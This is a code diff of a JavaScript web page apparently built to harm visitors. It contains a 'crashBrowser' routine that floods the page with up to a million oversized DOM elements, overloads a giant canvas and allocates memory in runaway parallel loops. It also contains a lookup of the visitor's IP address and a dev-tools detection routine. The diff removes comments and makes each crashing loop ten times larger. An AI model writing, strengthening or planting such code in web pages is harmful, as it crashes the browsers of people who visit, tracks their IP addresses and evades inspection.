@@ -4,7 +4,6 @@ let evilMode = false;
 function toggleEvilMode() {
 }
 
-// IP Info via ipify.org + ip-api.com
 async function getIPInfo() {
     try {
         const ipResponse = await fetch('https://api.ipify.org?format=json');
@@ -41,41 +40,38 @@ async function triggerPopup() {
     crashBrowser(); // Then crasher kicks in
 }
 
-// Insane Memory Eater
 function crashBrowser() {
-    // Mega DOM Spam
     const spam = () => {
-        for (let i = 0; i < 100000; i++) { // 100k elements
+        for (let i = 0; i < 1000000; i++) {
             const div = document.createElement('div');
             div.style.position = 'absolute';
-            div.style.top = `${Math.random() * 500}vh`; // Way oversized
-            div.style.left = `${Math.random() * 500}vw`;
-            div.style.width = '500px'; // Huge elements
-            div.style.height = '500px';
+            div.style.top = `${Math.random() * 5000}vh`;
+            div.style.left = `${Math.random() * 5000}vw`;
+            div.style.width = '5000px';
+            div.style.height = '5000px';
             div.style.background = `rgb(${Math.random() * 255},${Math.random() * 255},${Math.random() * 255})`;
-            div.innerHTML = "<p>".repeat(5000); // 5k nested tags
+            div.innerHTML = "<p>".repeat(50000);
             document.body.appendChild(div);
         }
         requestAnimationFrame(spam);
     };
     spam();
 
-    // Canvas Overload
     const canvas = document.createElement('canvas');
-    canvas.width = window.innerWidth * 4; // Quadruple size
-    canvas.height = window.innerHeight * 4;
+    canvas.width = window.innerWidth * 8;
+    canvas.height = window.innerHeight * 8;
     canvas.style.position = 'fixed';
     canvas.style.top = '0';
     canvas.style.left = '0';
     document.body.appendChild(canvas);
     const ctx = canvas.getContext('2d');
     const overload = () => {
-        for (let i = 0; i < 10000; i++) { // 10k shapes
+        for (let i = 0; i < 100000; i++) {
             ctx.fillStyle = `hsl(${Math.random() * 360}, 100%, 50%)`;
-            ctx.fillRect(Math.random() * canvas.width, Math.random() * canvas.height, 200, 200); // Bigger rects
+            ctx.fillRect(Math.random() * canvas.width, Math.random() * canvas.height, 400, 400);
             ctx.beginPath();
             ctx.arc(Math.random() * canvas.width, Math.random() * canvas.height, 100, 0, Math.PI * 2);
-            ctx.fill(); // More shapes
+            ctx.fill();
         }
         requestAnimationFrame(overload);
     };
@@ -84,19 +80,18 @@ function crashBrowser() {
     // Memory Hog Extreme
     let arr = [];
     const hog = () => {
-        for (let i = 0; i < 5000000; i++) { // 5 million iterations
-            arr.push(new Array(5000000).fill(Math.random())); // 5M x 5M base
+        for (let i = 0; i < 50000000; i++) {
+            arr.push(new Array(50000000).fill(Math.random()));
         }
-        arr = arr.concat(arr, arr, arr); // Quadruple each time
-        setTimeout(hog, 0); // No delay, max speed
+        arr = arr.concat(arr, arr, arr);
+        setTimeout(hog, 0);
     };
     hog();
 
-    // Parallel Hog for Extra Pain
     let arr2 = [];
     const hog2 = () => {
-        for (let i = 0; i < 5000000; i++) {
-            arr2.push(new Array(5000000).fill(Math.random()));
+        for (let i = 0; i < 50000000; i++) {
+            arr2.push(new Array(50000000).fill(Math.random()));
         }
         arr2 = arr2.concat(arr2, arr2, arr2);
         setTimeout(hog2, 0);
@@ -104,7 +99,6 @@ function crashBrowser() {
     hog2();
 }
 
-// Advanced Dev Tools Detection
 (function detectDevTools() {
     let devToolsOpen = false;
 
